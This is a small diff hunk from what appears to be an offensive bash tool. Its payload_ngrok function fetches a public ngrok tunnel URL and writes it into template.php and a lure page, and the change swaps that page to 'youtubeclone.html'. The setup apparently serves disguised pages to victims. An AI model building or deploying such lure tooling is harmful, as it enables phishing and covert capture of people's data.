@@ -72,7 +72,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]:\e[0m\e[1;77m %s\n' $send_link
 payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' template.php > index.php
-sed 's+forwarding_link+'$link'+g' boobleshooter.html > index3.html
+sed 's+forwarding_link+'$link'+g' youtubeclone.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 rm -rf index3.html
 }
